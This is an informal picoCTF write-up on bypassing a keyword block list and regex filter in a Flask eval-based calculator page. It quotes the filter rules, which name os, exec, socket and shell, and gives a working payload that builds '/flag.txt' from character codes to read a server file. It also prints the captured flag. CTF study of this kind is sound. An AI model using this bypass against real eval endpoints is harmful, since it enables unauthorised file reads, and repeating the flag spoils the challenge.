so first tried to run a lot of code used the synatx of cat or other various syntax but that failed so after that applied thw synatx of flag.txt in ascii as open with /  was restricted.

## Flag
picoCTF{D0nt_Use_Unsecure_f@nctions0c312090}

## Solve
- first i went to inspect the code in the give page and in the html file the forbinned pattern or the regex that we need to bypass was given 
- so we need that in mind and we can see a various things are blockef from the regex

```bash
<!DOCTYPE html>
<html lang="en">
<!--
    TODO

    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'

<body>
    <div class="container">
        <h1 class="mb-4 text-center">Bank-Loan Calculator</h1>
        <form method="post" action="/execute">
            <div class="form-group">
                <label for="code">Enter the formula:</label>
                <textarea id="code" name="code" class="form-control" rows="10" cols="50" placeholder="example: PRT*RATE*TIME(10000*23*12)" required></textarea>
            </div>
            <button type="submit" class="btn btn-primary">Execute</button>
        </form>
        <div class="footer-link mt-4">
            <a href="/">Go back</a>
        </div>
    </div>
</body>
</html>

```

- in this we can see that / is not allowed nor is \
- file extension
- hex codes were not allowd
- path traversing was not allowed also

so after so much blockage we we write the asci value of flag and try to use that to solve the question we can do the following that we use char join like in python to form the flag 
```bash
open(''.join([chr(x) for x in [47, 102, 108, 97, 103, 46, 116, 120, 116]])).read()
```

## REference 
None
